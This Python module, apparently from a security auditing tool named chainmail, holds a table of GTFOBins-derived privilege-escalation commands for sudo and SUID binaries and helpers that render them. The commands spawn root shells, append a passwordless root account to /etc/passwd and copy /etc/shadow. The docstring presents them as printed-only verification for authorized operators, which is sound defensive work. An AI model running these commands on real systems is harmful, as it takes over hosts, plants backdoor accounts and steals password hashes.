"""GTFOBins-derived escalation techniques for common binaries.

Each entry maps a binary basename to PoC *verification* command templates for
the two contexts chainmail reasons about:

* ``sudo``  -- the binary is runnable via sudo (as some target user). The PoC
  spawns a shell as that user.
* ``suid``  -- the binary carries the SUID bit (runs as its owner). The PoC
  drops a shell as the owner.

Templates use ``{path}`` for the absolute binary path and ``{user}`` for the
runas/owner principal. These commands are published, well-known techniques;
chainmail only prints them so an authorized operator can confirm a finding by
hand. chainmail never runs them.

This is a curated subset covering the binaries most often seen in the wild.
Extend freely -- the schema is intentionally trivial.
"""
from __future__ import annotations

# A value of None for a context means "not applicable / no simple PoC".
GTFOBINS: dict[str, dict[str, str | None]] = {
    "bash":   {"sudo": "sudo {path}", "suid": "{path} -p"},
    "sh":     {"sudo": "sudo {path}", "suid": "{path} -p"},
    "dash":   {"sudo": "sudo {path}", "suid": "{path} -p"},
    "zsh":    {"sudo": "sudo {path}", "suid": "{path}"},
    "ash":    {"sudo": "sudo {path}", "suid": "{path}"},
    "ksh":    {"sudo": "sudo {path}", "suid": "{path}"},

    "find":   {"sudo": "sudo {path} . -exec /bin/sh \\; -quit",
               "suid": "{path} . -exec /bin/sh -p \\; -quit"},
    "vim":    {"sudo": "sudo {path} -c ':!/bin/sh'",
               "suid": "{path} -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'"},
    "vi":     {"sudo": "sudo {path} -c ':!/bin/sh'", "suid": None},
    "nano":   {"sudo": "sudo {path}  # ^R^X then: reset; sh 1>&0 2>&0", "suid": None},
    "less":   {"sudo": "sudo {path} /etc/profile  # then !/bin/sh", "suid": None},
    "more":   {"sudo": "TERM= sudo {path} /etc/profile  # then !/bin/sh", "suid": None},
    "man":    {"sudo": "sudo {path} man  # then !/bin/sh", "suid": None},

    "awk":    {"sudo": "sudo {path} 'BEGIN {{system(\"/bin/sh\")}}'",
               "suid": "{path} 'BEGIN {{system(\"/bin/sh -p\")}}'"},
    "gawk":   {"sudo": "sudo {path} 'BEGIN {{system(\"/bin/sh\")}}'",
               "suid": "{path} 'BEGIN {{system(\"/bin/sh -p\")}}'"},
    "sed":    {"sudo": "sudo {path} -n '1e exec sh 1>&0' /etc/hostname", "suid": None},

    "python":   {"sudo": "sudo {path} -c 'import os; os.system(\"/bin/sh\")'",
                 "suid": "{path} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"},
    "python2":  {"sudo": "sudo {path} -c 'import os; os.system(\"/bin/sh\")'",
                 "suid": "{path} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"},
    "python3":  {"sudo": "sudo {path} -c 'import os; os.system(\"/bin/sh\")'",
                 "suid": "{path} -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"},
    "perl":     {"sudo": "sudo {path} -e 'exec \"/bin/sh\";'",
                 "suid": "{path} -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";'"},
    "ruby":     {"sudo": "sudo {path} -e 'exec \"/bin/sh\"'", "suid": None},
    "lua":      {"sudo": "sudo {path} -e 'os.execute(\"/bin/sh\")'", "suid": None},
    "node":     {"sudo": "sudo {path} -e 'require(\"child_process\").spawn(\"/bin/sh\",{{stdio:[0,1,2]}})'",
                 "suid": None},
    "php":      {"sudo": "sudo {path} -r 'system(\"/bin/sh\");'", "suid": None},

    "env":    {"sudo": "sudo {path} /bin/sh", "suid": "{path} /bin/sh -p"},
    "nice":   {"sudo": "sudo {path} /bin/sh", "suid": None},
    "nohup":  {"sudo": "sudo {path} /bin/sh -c 'sh <$(tty) >$(tty) 2>$(tty)'", "suid": None},
    "timeout":{"sudo": "sudo {path} 7d /bin/sh", "suid": None},
    "stdbuf": {"sudo": "sudo {path} -i0 /bin/sh", "suid": None},
    "xargs":  {"sudo": "sudo {path} -a /dev/null /bin/sh", "suid": None},

    "tar":    {"sudo": "sudo {path} -cf /dev/null /dev/null --checkpoint=1 "
                       "--checkpoint-action=exec=/bin/sh", "suid": None},
    "zip":    {"sudo": "TF=$(mktemp -u); sudo {path} $TF /etc/hostname -T "
                       "-TT 'sh #'", "suid": None},
    "cp":     {"sudo": "sudo {path} --no-preserve=mode /etc/shadow /tmp/shadow  "
                       "# read root-only files", "suid": None},
    "tee":    {"sudo": "echo 'evil::0:0::/root:/bin/sh' | sudo {path} -a /etc/passwd",
               "suid": None},
    "dd":     {"sudo": "echo 'evil::0:0::/root:/bin/sh' | sudo {path} of=/etc/passwd "
                       "conv=notrunc oflag=append", "suid": None},

    "nmap":   {"sudo": "TF=$(mktemp); echo 'os.execute(\"/bin/sh\")' > $TF; "
                       "sudo {path} --script=$TF", "suid": None},
    "git":    {"sudo": "sudo {path} -p help config  # then !/bin/sh", "suid": None},
    "ftp":    {"sudo": "sudo {path}  # then !/bin/sh", "suid": None},
    "gdb":    {"sudo": "sudo {path} -nx -ex '!sh' -ex quit",
               "suid": "{path} -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit"},
    "make":   {"sudo": "COMMAND='/bin/sh'; sudo {path} -s --eval=$'x:\\n\\t-'\"$COMMAND\"",
               "suid": None},
    "apt":    {"sudo": "sudo {path} update -o APT::Update::Pre-Invoke::=/bin/sh",
               "suid": None},
    "apt-get":{"sudo": "sudo {path} update -o APT::Update::Pre-Invoke::=/bin/sh",
               "suid": None},
    "systemctl": {"sudo": "sudo {path}  # link a unit with ExecStart=/bin/sh to escalate",
                  "suid": None},
    "mount":  {"sudo": "sudo {path} -o bind /bin/sh /bin/mount  # depends; see GTFOBins",
               "suid": None},
    "openssl":{"sudo": "sudo {path} req -engine /tmp/evil.so  # via crafted engine",
               "suid": None},
}


def lookup(binary_basename: str) -> dict[str, str | None] | None:
    return GTFOBINS.get(binary_basename)


def poc_for(binary_path: str, context: str, user: str) -> str | None:
    """Return a rendered PoC string for ``binary_path`` in the given context.

    ``context`` is "sudo" or "suid". Returns None if the binary is unknown or
    has no PoC for that context.
    """
    base = binary_path.rsplit("/", 1)[-1]
    entry = GTFOBINS.get(base)
    if not entry:
        return None
    template = entry.get(context)
    if not template:
        return None
    return template.format(path=binary_path, user=user)
